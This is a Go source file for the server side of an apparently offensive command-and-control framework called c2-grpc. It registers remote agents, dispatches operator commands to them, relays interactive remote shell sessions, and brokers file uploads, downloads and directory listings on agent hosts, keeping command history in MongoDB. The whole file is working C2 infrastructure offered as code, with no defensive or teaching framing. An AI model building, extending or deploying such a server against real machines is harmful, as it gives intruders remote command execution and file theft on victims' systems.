package main

import (
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	pb "github.com/ardhptr21/c2-grpc/pb"
	"github.com/google/uuid"
	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/mongo"
	"go.mongodb.org/mongo-driver/mongo/options"
	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
)

type Agent struct {
	Hostname string
	OS       string
	IP       string
	Status   string
	LastSeen time.Time
}

type AgentRecord struct {
	AgentID   string    `bson:"agent_id"`
	Hostname  string    `bson:"hostname"`
	OS        string    `bson:"os"`
	IP        string    `bson:"ip"`
	Status    string    `bson:"status"`
	LastSeen  time.Time `bson:"last_seen"`
	IsOnline  bool      `bson:"is_online"`
	UpdatedAt time.Time `bson:"updated_at"`
}

type TaskExecution struct {
	TaskID      string    `bson:"task_id"`
	AgentID     string    `bson:"agent_id"`
	Command     string    `bson:"command"`
	Args        string    `bson:"args"`
	Output      string    `bson:"output"`
	ExecutedAt  time.Time `bson:"executed_at"`
	CompletedAt time.Time `bson:"completed_at"`
}

type TaskRecord struct {
	TaskID     string
	AgentID    string
	Command    string
	Args       string
	ExecutedAt time.Time
}

type agentShellConn struct {
	stream pb.ShellService_AgentShellServer
	mu     sync.Mutex
}

type operatorShellConn struct {
	stream pb.ShellService_OperatorShellServer
	mu     sync.Mutex
}

type shellSession struct {
	AgentID    string
	OperatorID string
}

type agentFileConn struct {
	stream pb.FileService_AgentTransferServer
	mu     sync.Mutex
}

type operatorFileConn struct {
	stream pb.FileService_OperatorTransferServer
	mu     sync.Mutex
}

type fileTransfer struct {
	AgentID    string
	OperatorID string
}

var (
	agentsMu sync.RWMutex
	agents   = make(map[string]*Agent)

	tasksMu sync.Mutex
	tasks   = make(map[string][]pb.Task)

	outputsMu sync.Mutex
	outputs   = make(map[string][]string)

	taskRecordsMu sync.Mutex
	taskRecords   = make(map[string]TaskRecord)

	operatorsMu sync.Mutex
	operators   = make(map[string]pb.OperatorService_ConnectServer)

	agentStreamsMu sync.Mutex
	agentStreams   = make(map[string]pb.TaskService_ReceiveTasksServer)

	agentShellsMu sync.Mutex
	agentShells   = make(map[string]*agentShellConn)

	operatorShellsMu sync.Mutex
	operatorShells   = make(map[string]*operatorShellConn)

	shellSessionsMu sync.Mutex
	shellSessions   = make(map[string]shellSession)

	agentFilesMu sync.Mutex
	agentFiles   = make(map[string]*agentFileConn)

	operatorFilesMu sync.Mutex
	operatorFiles   = make(map[string]*operatorFileConn)

	fileTransfersMu sync.Mutex
	fileTransfers   = make(map[string]fileTransfer)

	mongoClient       *mongo.Client
	historyCollection *mongo.Collection
	agentCollection   *mongo.Collection
)

type agentServer struct {
	pb.UnimplementedAgentServiceServer
}

type heartbeatServer struct {
	pb.UnimplementedHeartbeatServiceServer
}

type taskServer struct {
	pb.UnimplementedTaskServiceServer
}

type outputServer struct {
	pb.UnimplementedOutputServiceServer
}

type operatorServer struct {
	pb.UnimplementedOperatorServiceServer
}

type historyServer struct {
	pb.UnimplementedHistoryServiceServer
}

type shellServer struct {
	pb.UnimplementedShellServiceServer
}

type fileServer struct {
	pb.UnimplementedFileServiceServer
}

func shortUUID(n int) string {
	return uuid.NewString()[:n]
}

func removeAgent(agentID string) (string, bool) {
	agentsMu.Lock()
	agent, ok := agents[agentID]
	if ok {
		delete(agents, agentID)
	}
	agentsMu.Unlock()
	if !ok {
		return "", false
	}

	tasksMu.Lock()
	delete(tasks, agentID)
	tasksMu.Unlock()

	var taskIDs []string
	taskRecordsMu.Lock()
	for taskID, record := range taskRecords {
		if record.AgentID == agentID {
			taskIDs = append(taskIDs, taskID)
			delete(taskRecords, taskID)
		}
	}
	taskRecordsMu.Unlock()

	outputsMu.Lock()
	for _, taskID := range taskIDs {
		delete(outputs, taskID)
	}
	outputsMu.Unlock()

	agentStreamsMu.Lock()
	delete(agentStreams, agentID)
	agentStreamsMu.Unlock()

	agentShellsMu.Lock()
	delete(agentShells, agentID)
	agentShellsMu.Unlock()

	shellSessionsMu.Lock()
	for sessionID, session := range shellSessions {
		if session.AgentID == agentID {
			delete(shellSessions, sessionID)
		}
	}
	shellSessionsMu.Unlock()

	agentFilesMu.Lock()
	delete(agentFiles, agentID)
	agentFilesMu.Unlock()

	fileTransfersMu.Lock()
	for transferID, transfer := range fileTransfers {
		if transfer.AgentID == agentID {
			delete(fileTransfers, transferID)
		}
	}
	fileTransfersMu.Unlock()

	return agent.Hostname, true
}

func removeAgentAndBroadcast(agentID string) {
	hostname, ok := removeAgent(agentID)
	if !ok {
		return
	}
	markAgentOffline(agentID, hostname)

	go broadcastToOperators(&pb.OperatorEvent{
		Type:    "agent_removed",
		AgentId: agentID,
		Payload: hostname,
	})
}

func broadcastToOperators(event *pb.OperatorEvent) {
	operatorsMu.Lock()
	streams := make([]pb.OperatorService_ConnectServer, 0, len(operators))
	for _, stream := range operators {
		streams = append(streams, stream)
	}
	operatorsMu.Unlock()

	for _, stream := range streams {
		_ = stream.Send(event)
	}
}

func sendToAgentShell(agentID string, req *pb.OperatorShellRequest) error {
	agentShellsMu.Lock()
	conn, ok := agentShells[agentID]
	agentShellsMu.Unlock()
	if !ok {
		return status.Error(codes.NotFound, "agent shell stream unavailable")
	}

	conn.mu.Lock()
	defer conn.mu.Unlock()
	return conn.stream.Send(req)
}

func sendToOperatorShell(operatorID string, event *pb.AgentShellEvent) error {
	operatorShellsMu.Lock()
	conn, ok := operatorShells[operatorID]
	operatorShellsMu.Unlock()
	if !ok {
		return status.Error(codes.NotFound, "operator shell stream unavailable")
	}

	conn.mu.Lock()
	defer conn.mu.Unlock()
	return conn.stream.Send(event)
}

func sendToAgentFile(agentID string, req *pb.OperatorFileRequest) error {
	agentFilesMu.Lock()
	conn, ok := agentFiles[agentID]
	agentFilesMu.Unlock()
	if !ok {
		return status.Error(codes.NotFound, "agent file stream unavailable")
	}

	conn.mu.Lock()
	defer conn.mu.Unlock()
	return conn.stream.Send(req)
}

func sendToOperatorFile(operatorID string, event *pb.AgentFileEvent) error {
	operatorFilesMu.Lock()
	conn, ok := operatorFiles[operatorID]
	operatorFilesMu.Unlock()
	if !ok {
		return status.Error(codes.NotFound, "operator file stream unavailable")
	}

	conn.mu.Lock()
	defer conn.mu.Unlock()
	return conn.stream.Send(event)
}

func closeFileTransfersForOperator(operatorID string) {
	var requests []*pb.OperatorFileRequest

	fileTransfersMu.Lock()
	for transferID, transfer := range fileTransfers {
		if transfer.OperatorID == operatorID {
			requests = append(requests, &pb.OperatorFileRequest{
				Type:       "cancel",
				TransferId: transferID,
				AgentId:    transfer.AgentID,
			})
			delete(fileTransfers, transferID)
		}
	}
	fileTransfersMu.Unlock()

	for _, req := range requests {
		_ = sendToAgentFile(req.GetAgentId(), req)
	}
}

func closeFileTransfersForAgent(agentID string) {
	var notify []struct {
		operatorID string
		transferID string
		remotePath string
	}

	fileTransfersMu.Lock()
	for transferID, transfer := range fileTransfers {
		if transfer.AgentID == agentID {
			notify = append(notify, struct {
				operatorID string
				transferID string
				remotePath string
			}{operatorID: transfer.OperatorID, transferID: transferID})
			delete(fileTransfers, transferID)
		}
	}
	fileTransfersMu.Unlock()

	for _, item := range notify {
		_ = sendToOperatorFile(item.operatorID, &pb.AgentFileEvent{
			Type:       "error",
			TransferId: item.transferID,
			AgentId:    agentID,
			Message:    "agent file transfer disconnected",
		})
	}
}

func closeShellSessionsForOperator(operatorID string) {
	var requests []*pb.OperatorShellRequest

	shellSessionsMu.Lock()
	for sessionID, session := range shellSessions {
		if session.OperatorID == operatorID {
			requests = append(requests, &pb.OperatorShellRequest{
				Type:      "close",
				SessionId: sessionID,
				AgentId:   session.AgentID,
			})
			delete(shellSessions, sessionID)
		}
	}
	shellSessionsMu.Unlock()

	for _, req := range requests {
		_ = sendToAgentShell(req.GetAgentId(), req)
	}
}

func closeShellSessionsForAgent(agentID string) {
	var notify []struct {
		operatorID string
		sessionID  string
	}

	shellSessionsMu.Lock()
	for sessionID, session := range shellSessions {
		if session.AgentID == agentID {
			notify = append(notify, struct {
				operatorID string
				sessionID  string
			}{operatorID: session.OperatorID, sessionID: sessionID})
			delete(shellSessions, sessionID)
		}
	}
	shellSessionsMu.Unlock()

	for _, item := range notify {
		_ = sendToOperatorShell(item.operatorID, &pb.AgentShellEvent{
			Type:      "closed",
			SessionId: item.sessionID,
			AgentId:   agentID,
			Message:   "agent shell disconnected",
		})
	}
}

func connectMongo(ctx context.Context) (*mongo.Client, *mongo.Collection, *mongo.Collection, error) {
	client, err := mongo.Connect(ctx, options.Client().ApplyURI("mongodb://localhost:27017"))
	if err != nil {
		return nil, nil, nil, err
	}

	if err := client.Ping(ctx, nil); err != nil {
		_ = client.Disconnect(context.Background())
		return nil, nil, nil, err
	}

	db := client.Database("c2_grpc")
	history := db.Collection("command_history")
	_, err = history.Indexes().CreateOne(ctx, mongo.IndexModel{
		Keys: bson.D{
			{Key: "agent_id", Value: 1},
			{Key: "executed_at", Value: -1},
		},
	})
	if err != nil {
		_ = client.Disconnect(context.Background())
		return nil, nil, nil, err
	}

	agents := db.Collection("agents")
	_, err = agents.Indexes().CreateOne(ctx, mongo.IndexModel{
		Keys:    bson.D{{Key: "agent_id", Value: 1}},
		Options: options.Index().SetUnique(true),
	})
	if err != nil {
		_ = client.Disconnect(context.Background())
		return nil, nil, nil, err
	}

	return client, history, agents, nil
}

func trackTask(agentID string, task pb.Task) {
	taskRecordsMu.Lock()
	taskRecords[task.GetTaskId()] = TaskRecord{
		TaskID:     task.GetTaskId(),
		AgentID:    agentID,
		Command:    task.GetCommand(),
		Args:       task.GetArgs(),
		ExecutedAt: time.Now(),
	}
	taskRecordsMu.Unlock()
}

func upsertAgentRecord(agentID string, agent *Agent, isOnline bool) {
	if agentCollection == nil || agent == nil {
		return
	}

	doc := bson.M{
		"agent_id":   agentID,
		"hostname":   agent.Hostname,
		"os":         agent.OS,
		"ip":         agent.IP,
		"status":     agent.Status,
		"last_seen":  agent.LastSeen,
		"is_online":  isOnline,
		"updated_at": time.Now(),
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	_, err := agentCollection.UpdateOne(
		ctx,
		bson.M{"agent_id": agentID},
		bson.M{"$set": doc},
		options.Update().SetUpsert(true),
	)
	if err != nil {
		log.Printf("[server] agent upsert error for %s: %v", agentID, err)
	}
}

func markAgentOffline(agentID string, hostname string) {
	if agentCollection == nil || agentID == "" {
		return
	}

	update := bson.M{
		"status":     "OFFLINE",
		"is_online":  false,
		"updated_at": time.Now(),
	}
	if hostname != "" {
		update["hostname"] = hostname
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	_, err := agentCollection.UpdateOne(
		ctx,
		bson.M{"agent_id": agentID},
		bson.M{"$set": update},
	)
	if err != nil {
		log.Printf("[server] mark agent offline error for %s: %v", agentID, err)
	}
}

func loadKnownAgents(ctx context.Context) ([]AgentRecord, error) {
	if agentCollection == nil {
		return nil, nil
	}

	cursor, err := agentCollection.Find(
		ctx,
		bson.M{},
		options.Find().SetSort(bson.D{{Key: "updated_at", Value: -1}}),
	)
	if err != nil {
		return nil, err
	}
	defer cursor.Close(ctx)

	var docs []AgentRecord
	if err := cursor.All(ctx, &docs); err != nil {
		return nil, err
	}
	return docs, nil
}

func persistTaskHistory(taskID string) {
	taskRecordsMu.Lock()
	record, ok := taskRecords[taskID]
	if ok {
		delete(taskRecords, taskID)
	}
	taskRecordsMu.Unlock()
	if !ok {
		return
	}

	outputsMu.Lock()
	lines := append([]string(nil), outputs[taskID]...)
	delete(outputs, taskID)
	outputsMu.Unlock()

	if historyCollection == nil {
		return
	}

	doc := TaskExecution{
		TaskID:      record.TaskID,
		AgentID:     record.AgentID,
		Command:     record.Command,
		Args:        record.Args,
		Output:      strings.Join(lines, ""),
		ExecutedAt:  record.ExecutedAt,
		CompletedAt: time.Now(),
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	if _, err := historyCollection.InsertOne(ctx, doc); err != nil {
		log.Printf("[server] mongo insert error for task %s: %v", taskID, err)
		return
	}

	entryPayload, err := json.Marshal(&pb.AgentHistoryEntry{
		TaskId:      doc.TaskID,
		AgentId:     doc.AgentID,
		Command:     doc.Command,
		Args:        doc.Args,
		Output:      doc.Output,
		ExecutedAt:  doc.ExecutedAt.UnixMilli(),
		CompletedAt: doc.CompletedAt.UnixMilli(),
	})
	if err != nil {
		log.Printf("[server] history payload encode error for task %s: %v", taskID, err)
		return
	}

	broadcastToOperators(&pb.OperatorEvent{
		Type:    "history_updated",
		AgentId: record.AgentID,
		Payload: string(entryPayload),
	})
}

func startWatchdog() {
	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		var staleAgentIDs []string

		agentsMu.Lock()
		for id, agent := range agents {
			if time.Since(agent.LastSeen) > 10*time.Second {
				staleAgentIDs = append(staleAgentIDs, id)
			}
		}
		agentsMu.Unlock()

		for _, agentID := range staleAgentIDs {
			removeAgentAndBroadcast(agentID)
		}
	}
}

func (s *agentServer) Register(ctx context.Context, req *pb.RegisterRequest) (*pb.RegisterResponse, error) {
	machineID := strings.TrimSpace(req.GetMachineId())
	if machineID == "" {
		return nil, status.Error(codes.InvalidArgument, "machine_id is required")
	}

	agentsMu.Lock()
	defer agentsMu.Unlock()

	if _, exists := agents[machineID]; exists {
		return nil, status.Error(codes.AlreadyExists, "agent already registered")
	}

	agents[machineID] = &Agent{
		Hostname: req.GetHostname(),
		OS:       req.GetOs(),
		IP:       req.GetIp(),
		Status:   "ALIVE",
		LastSeen: time.Now(),
	}
	upsertAgentRecord(machineID, agents[machineID], true)

	tasksMu.Lock()
	if _, exists := tasks[machineID]; !exists {
		tasks[machineID] = []pb.Task{}
	}
	tasksMu.Unlock()

	go broadcastToOperators(&pb.OperatorEvent{
		Type:    "agent_joined",
		AgentId: machineID,
		Payload: fmt.Sprintf("%s @ %s", req.GetHostname(), req.GetIp()),
	})

	return &pb.RegisterResponse{
		AgentId: machineID,
		Message: fmt.Sprintf("Welcome, %s. Your ID is %s", req.GetHostname(), machineID),
	}, nil
}

func (s *agentServer) Unregister(ctx context.Context, req *pb.UnregisterRequest) (*pb.UnregisterResponse, error) {
	hostname, ok := removeAgent(req.GetAgentId())
	if !ok {
		return nil, status.Error(codes.NotFound, "agent not found")
	}
	markAgentOffline(req.GetAgentId(), hostname)

	go broadcastToOperators(&pb.OperatorEvent{
		Type:    "agent_removed",
		AgentId: req.GetAgentId(),
		Payload: hostname,
	})

	return &pb.UnregisterResponse{
		Success: true,
		Message: fmt.Sprintf("Agent %s removed", req.GetAgentId()),
	}, nil
}

func (s *heartbeatServer) SendHeartbeat(stream pb.HeartbeatService_SendHeartbeatServer) error {
	var count int32
	lastStatus := ""
	agentID := ""

	for {
		req, err := stream.Recv()
		if err == io.EOF {
			if agentID != "" {
				removeAgentAndBroadcast(agentID)
			}
			return stream.SendAndClose(&pb.HeartbeatSummary{
				TotalReceived: count,
				LastStatus:    lastStatus,
			})
		}
		if err != nil {
			if agentID != "" {
				removeAgentAndBroadcast(agentID)
			}
			return status.Error(codes.Internal, err.Error())
		}

		agentID = req.GetAgentId()

		agentsMu.Lock()
		if agent, ok := agents[agentID]; ok {
			agent.Status = normalizeStatus(req.GetStatus())
			agent.LastSeen = time.Now()
			upsertAgentRecord(agentID, agent, true)
		}
		agentsMu.Unlock()

		count++
		lastStatus = req.GetStatus()
	}
}

func normalizeStatus(statusText string) string {
	switch statusText {
	case "alive":
		return "ALIVE"
	case "idle":
		return "IDLE"
	case "busy":
		return "BUSY"
	default:
		return "ALIVE"
	}
}

func (s *taskServer) ReceiveTasks(req *pb.TaskRequest, stream pb.TaskService_ReceiveTasksServer) error {
	agentsMu.RLock()
	_, ok := agents[req.GetAgentId()]
	agentsMu.RUnlock()
	if !ok {
		return status.Error(codes.NotFound, "agent not found")
	}

	agentStreamsMu.Lock()
	agentStreams[req.GetAgentId()] = stream
	agentStreamsMu.Unlock()

	tasksMu.Lock()
	queued := append([]pb.Task(nil), tasks[req.GetAgentId()]...)
	tasks[req.GetAgentId()] = nil
	tasksMu.Unlock()

	for i, task := range queued {
		if err := stream.Send(&task); err != nil {
			agentStreamsMu.Lock()
			delete(agentStreams, req.GetAgentId())
			agentStreamsMu.Unlock()

			tasksMu.Lock()
			tasks[req.GetAgentId()] = append(tasks[req.GetAgentId()], queued[i:]...)
			tasksMu.Unlock()
			return err
		}
	}

	<-stream.Context().Done()

	agentStreamsMu.Lock()
	delete(agentStreams, req.GetAgentId())
	agentStreamsMu.Unlock()

	return nil
}

func (s *outputServer) SendOutput(stream pb.OutputService_SendOutputServer) error {
	taskID := ""

	for {
		chunk, err := stream.Recv()
		if err == io.EOF {
			if taskID != "" {
				persistTaskHistory(taskID)
			}
			return stream.SendAndClose(&pb.OutputAck{
				TaskId:  taskID,
				Success: true,
			})
		}
		if err != nil {
			return status.Error(codes.Internal, err.Error())
		}

		taskID = chunk.GetTaskId()

		outputsMu.Lock()
		outputs[taskID] = append(outputs[taskID], chunk.GetLine())
		outputsMu.Unlock()

		broadcastToOperators(&pb.OperatorEvent{
			Type:    "output",
			AgentId: chunk.GetAgentId(),
			Payload: chunk.GetLine(),
		})
	}
}

func (s *operatorServer) Connect(stream pb.OperatorService_ConnectServer) error {
	opID := shortUUID(6)

	operatorsMu.Lock()
	operators[opID] = stream
	operatorsMu.Unlock()
	defer func() {
		operatorsMu.Lock()
		delete(operators, opID)
		operatorsMu.Unlock()
	}()

	type rosterEntry struct {
		id       string
		hostname string
		status   string
		ip       string
	}

	agentsMu.RLock()
	roster := make([]rosterEntry, 0, len(agents))
	for id, agent := range agents {
		roster = append(roster, rosterEntry{id: id, hostname: agent.Hostname, status: agent.Status, ip: agent.IP})
	}
	agentsMu.RUnlock()

	for _, agent := range roster {
		if err := stream.Send(&pb.OperatorEvent{
			Type:    "agent_joined",
			AgentId: agent.id,
			Payload: fmt.Sprintf("%s @ %s [%s]", agent.hostname, agent.ip, agent.status),
		}); err != nil {
			return err
		}
	}

	queryCtx, cancel := context.WithTimeout(stream.Context(), 5*time.Second)
	knownAgents, err := loadKnownAgents(queryCtx)
	cancel()
	if err != nil {
		log.Printf("[server] load known agents error: %v", err)
	} else {
		live := make(map[string]struct{}, len(roster))
		for _, agent := range roster {
			live[agent.id] = struct{}{}
		}
		for _, agent := range knownAgents {
			if _, ok := live[agent.AgentID]; ok {
				continue
			}
			if err := stream.Send(&pb.OperatorEvent{
				Type:    "agent_cached",
				AgentId: agent.AgentID,
				Payload: fmt.Sprintf("%s @ %s [OFFLINE]", agent.Hostname, agent.IP),
			}); err != nil {
				return err
			}
		}
	}

	errCh := make(chan error, 1)

	go func() {
		defer close(errCh)
		for {
			cmd, err := stream.Recv()
			if err == io.EOF || stream.Context().Err() != nil {
				errCh <- nil
				return
			}
			if err != nil {
				log.Printf("[server] operator recv error: %v", err)
				errCh <- err
				return
			}

			agentsMu.RLock()
			_, exists := agents[cmd.GetTargetAgentId()]
			agentsMu.RUnlock()
			if !exists {
				_ = stream.Send(&pb.OperatorEvent{
					Type:    "error",
					AgentId: cmd.GetTargetAgentId(),
					Payload: "ERROR: agent not found",
				})
				continue
			}

			taskID := shortUUID(6)
			task := pb.Task{
				TaskId:  taskID,
				Command: cmd.GetCommand(),
				Args:    cmd.GetArgs(),
			}
			trackTask(cmd.GetTargetAgentId(), task)
			pushTaskToAgent(cmd.GetTargetAgentId(), task)

			_ = stream.Send(&pb.OperatorEvent{
				Type:    "ack",
				AgentId: cmd.GetTargetAgentId(),
				Payload: fmt.Sprintf("Task %s dispatched: %s %s", taskID, cmd.GetCommand(), cmd.GetArgs()),
			})
		}
	}()

	select {
	case <-stream.Context().Done():
		return nil
	case err := <-errCh:
		return err
	}
}

func (s *historyServer) ListAgentHistory(ctx context.Context, req *pb.AgentHistoryRequest) (*pb.AgentHistoryResponse, error) {
	if historyCollection == nil {
		return nil, status.Error(codes.FailedPrecondition, "history storage unavailable")
	}
	if req.GetAgentId() == "" {
		return nil, status.Error(codes.InvalidArgument, "agent_id is required")
	}

	limit := req.GetLimit()
	if limit <= 0 || limit > 200 {
		limit = 50
	}

	queryCtx, cancel := context.WithTimeout(ctx, 5*time.Second)
	defer cancel()

	cursor, err := historyCollection.Find(
		queryCtx,
		bson.M{"agent_id": req.GetAgentId()},
		options.Find().SetSort(bson.D{{Key: "executed_at", Value: -1}}).SetLimit(int64(limit)),
	)
	if err != nil {
		return nil, status.Error(codes.Internal, err.Error())
	}
	defer cursor.Close(queryCtx)

	var docs []TaskExecution
	if err := cursor.All(queryCtx, &docs); err != nil {
		return nil, status.Error(codes.Internal, err.Error())
	}

	resp := &pb.AgentHistoryResponse{
		Entries: make([]*pb.AgentHistoryEntry, 0, len(docs)),
	}
	for _, doc := range docs {
		resp.Entries = append(resp.Entries, &pb.AgentHistoryEntry{
			TaskId:      doc.TaskID,
			AgentId:     doc.AgentID,
			Command:     doc.Command,
			Args:        doc.Args,
			Output:      doc.Output,
			ExecutedAt:  doc.ExecutedAt.UnixMilli(),
			CompletedAt: doc.CompletedAt.UnixMilli(),
		})
	}
	return resp, nil
}

func (s *shellServer) AgentShell(stream pb.ShellService_AgentShellServer) error {
	var agentID string

	for {
		event, err := stream.Recv()
		if err == io.EOF {
			if agentID != "" {
				agentShellsMu.Lock()
				delete(agentShells, agentID)
				agentShellsMu.Unlock()
				closeShellSessionsForAgent(agentID)
			}
			return nil
		}
		if err != nil {
			if agentID != "" {
				agentShellsMu.Lock()
				delete(agentShells, agentID)
				agentShellsMu.Unlock()
				closeShellSessionsForAgent(agentID)
			}
			return err
		}

		if event.GetType() == "register" {
			agentID = event.GetAgentId()
			agentShellsMu.Lock()
			agentShells[agentID] = &agentShellConn{stream: stream}
			agentShellsMu.Unlock()
			continue
		}

		shellSessionsMu.Lock()
		session, ok := shellSessions[event.GetSessionId()]
		shellSessionsMu.Unlock()
		if !ok {
			continue
		}
		_ = sendToOperatorShell(session.OperatorID, event)
		if event.GetType() == "closed" || event.GetType() == "open_error" {
			shellSessionsMu.Lock()
			delete(shellSessions, event.GetSessionId())
			shellSessionsMu.Unlock()
		}
	}
}

func (s *shellServer) OperatorShell(stream pb.ShellService_OperatorShellServer) error {
	operatorID := shortUUID(8)

	operatorShellsMu.Lock()
	operatorShells[operatorID] = &operatorShellConn{stream: stream}
	operatorShellsMu.Unlock()
	defer func() {
		operatorShellsMu.Lock()
		delete(operatorShells, operatorID)
		operatorShellsMu.Unlock()
		closeShellSessionsForOperator(operatorID)
	}()

	for {
		req, err := stream.Recv()
		if err == io.EOF || stream.Context().Err() != nil {
			return nil
		}
		if err != nil {
			return err
		}

		switch req.GetType() {
		case "open":
			if req.GetAgentId() == "" {
				_ = sendToOperatorShell(operatorID, &pb.AgentShellEvent{
					Type:    "open_error",
					AgentId: req.GetAgentId(),
					Message: "agent_id is required",
				})
				continue
			}

			sessionID := shortUUID(12)
			shellSessionsMu.Lock()
			shellSessions[sessionID] = shellSession{
				AgentID:    req.GetAgentId(),
				OperatorID: operatorID,
			}
			shellSessionsMu.Unlock()

			forward := &pb.OperatorShellRequest{
				Type:      "open",
				SessionId: sessionID,
				AgentId:   req.GetAgentId(),
				Cols:      req.GetCols(),
				Rows:      req.GetRows(),
			}
			if err := sendToAgentShell(req.GetAgentId(), forward); err != nil {
				shellSessionsMu.Lock()
				delete(shellSessions, sessionID)
				shellSessionsMu.Unlock()
				_ = sendToOperatorShell(operatorID, &pb.AgentShellEvent{
					Type:      "open_error",
					SessionId: sessionID,
					AgentId:   req.GetAgentId(),
					Message:   err.Error(),
				})
			}
		case "input", "resize", "close":
			shellSessionsMu.Lock()
			session, ok := shellSessions[req.GetSessionId()]
			shellSessionsMu.Unlock()
			if !ok {
				continue
			}
			req.AgentId = session.AgentID
			if err := sendToAgentShell(session.AgentID, req); err != nil {
				_ = sendToOperatorShell(operatorID, &pb.AgentShellEvent{
					Type:      "closed",
					SessionId: req.GetSessionId(),
					AgentId:   session.AgentID,
					Message:   err.Error(),
				})
				shellSessionsMu.Lock()
				delete(shellSessions, req.GetSessionId())
				shellSessionsMu.Unlock()
			}
			if req.GetType() == "close" {
				shellSessionsMu.Lock()
				delete(shellSessions, req.GetSessionId())
				shellSessionsMu.Unlock()
			}
		}
	}
}

func (s *fileServer) AgentTransfer(stream pb.FileService_AgentTransferServer) error {
	var agentID string

	for {
		event, err := stream.Recv()
		if err == io.EOF {
			if agentID != "" {
				agentFilesMu.Lock()
				delete(agentFiles, agentID)
				agentFilesMu.Unlock()
				closeFileTransfersForAgent(agentID)
			}
			return nil
		}
		if err != nil {
			if agentID != "" {
				agentFilesMu.Lock()
				delete(agentFiles, agentID)
				agentFilesMu.Unlock()
				closeFileTransfersForAgent(agentID)
			}
			return err
		}

		if event.GetType() == "register" {
			agentID = event.GetAgentId()
			agentFilesMu.Lock()
			agentFiles[agentID] = &agentFileConn{stream: stream}
			agentFilesMu.Unlock()
			continue
		}

		fileTransfersMu.Lock()
		transfer, ok := fileTransfers[event.GetTransferId()]
		fileTransfersMu.Unlock()
		if !ok {
			continue
		}

		_ = sendToOperatorFile(transfer.OperatorID, event)
		switch event.GetType() {
		case "upload_done", "download_done", "list_done", "error":
			fileTransfersMu.Lock()
			delete(fileTransfers, event.GetTransferId())
			fileTransfersMu.Unlock()
		}
	}
}

func (s *fileServer) OperatorTransfer(stream pb.FileService_OperatorTransferServer) error {
	operatorID := shortUUID(8)

	operatorFilesMu.Lock()
	operatorFiles[operatorID] = &operatorFileConn{stream: stream}
	operatorFilesMu.Unlock()
	defer func() {
		operatorFilesMu.Lock()
		delete(operatorFiles, operatorID)
		operatorFilesMu.Unlock()
		closeFileTransfersForOperator(operatorID)
	}()

	for {
		req, err := stream.Recv()
		if err == io.EOF || stream.Context().Err() != nil {
			return nil
		}
		if err != nil {
			return err
		}

		switch req.GetType() {
		case "upload_start", "download", "list":
			if req.GetAgentId() == "" || req.GetTransferId() == "" {
				_ = sendToOperatorFile(operatorID, &pb.AgentFileEvent{
					Type:       "error",
					TransferId: req.GetTransferId(),
					AgentId:    req.GetAgentId(),
					Message:    "agent_id and transfer_id are required",
				})
				continue
			}

			fileTransfersMu.Lock()
			fileTransfers[req.GetTransferId()] = fileTransfer{
				AgentID:    req.GetAgentId(),
				OperatorID: operatorID,
			}
			fileTransfersMu.Unlock()

			if err := sendToAgentFile(req.GetAgentId(), req); err != nil {
				fileTransfersMu.Lock()
				delete(fileTransfers, req.GetTransferId())
				fileTransfersMu.Unlock()
				_ = sendToOperatorFile(operatorID, &pb.AgentFileEvent{
					Type:       "error",
					TransferId: req.GetTransferId(),
					AgentId:    req.GetAgentId(),
					Path:       req.GetPath(),
					Message:    err.Error(),
				})
			}
		case "upload_chunk", "upload_end", "cancel":
			fileTransfersMu.Lock()
			transfer, ok := fileTransfers[req.GetTransferId()]
			fileTransfersMu.Unlock()
			if !ok {
				continue
			}
			req.AgentId = transfer.AgentID
			if err := sendToAgentFile(transfer.AgentID, req); err != nil {
				_ = sendToOperatorFile(operatorID, &pb.AgentFileEvent{
					Type:       "error",
					TransferId: req.GetTransferId(),
					AgentId:    transfer.AgentID,
					Path:       req.GetPath(),
					Message:    err.Error(),
				})
				fileTransfersMu.Lock()
				delete(fileTransfers, req.GetTransferId())
				fileTransfersMu.Unlock()
			}
			if req.GetType() == "cancel" {
				fileTransfersMu.Lock()
				delete(fileTransfers, req.GetTransferId())
				fileTransfersMu.Unlock()
			}
		}
	}
}

func pushTaskToAgent(agentID string, task pb.Task) {
	agentStreamsMu.Lock()
	stream, ok := agentStreams[agentID]
	agentStreamsMu.Unlock()

	if ok {
		if err := stream.Send(&task); err == nil {
			return
		}
	}

	tasksMu.Lock()
	tasks[agentID] = append(tasks[agentID], task)
	tasksMu.Unlock()
}

func main() {
	host := flag.String("host", "0.0.0.0", "host interface to bind the gRPC server to")
	port := flag.Int("port", 50051, "TCP port to bind the gRPC server to")
	flag.Parse()

	mongoCtx, cancelMongo := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancelMongo()

	var err error
	mongoClient, historyCollection, agentCollection, err = connectMongo(mongoCtx)
	if err != nil {
		log.Fatalf("mongo connect error: %v", err)
	}
	defer func() {
		disconnectCtx, cancelDisconnect := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancelDisconnect()
		_ = mongoClient.Disconnect(disconnectCtx)
	}()

	listenAddr := net.JoinHostPort(*host, strconv.Itoa(*port))
	lis, err := net.Listen("tcp", listenAddr)
	if err != nil {
		log.Fatalf("listen error: %v", err)
	}

	log.Printf("[server] c2-grpc server running on %s", lis.Addr().String())
	log.Printf("[server] mongodb connected on localhost:27017")

	s := grpc.NewServer()
	pb.RegisterAgentServiceServer(s, &agentServer{})
	pb.RegisterHeartbeatServiceServer(s, &heartbeatServer{})
	pb.RegisterTaskServiceServer(s, &taskServer{})
	pb.RegisterOutputServiceServer(s, &outputServer{})
	pb.RegisterOperatorServiceServer(s, &operatorServer{})
	pb.RegisterHistoryServiceServer(s, &historyServer{})
	pb.RegisterShellServiceServer(s, &shellServer{})
	pb.RegisterFileServiceServer(s, &fileServer{})

	go startWatchdog()

	if err := s.Serve(lis); err != nil {
		log.Fatalf("serve error: %v", err)
	}
}
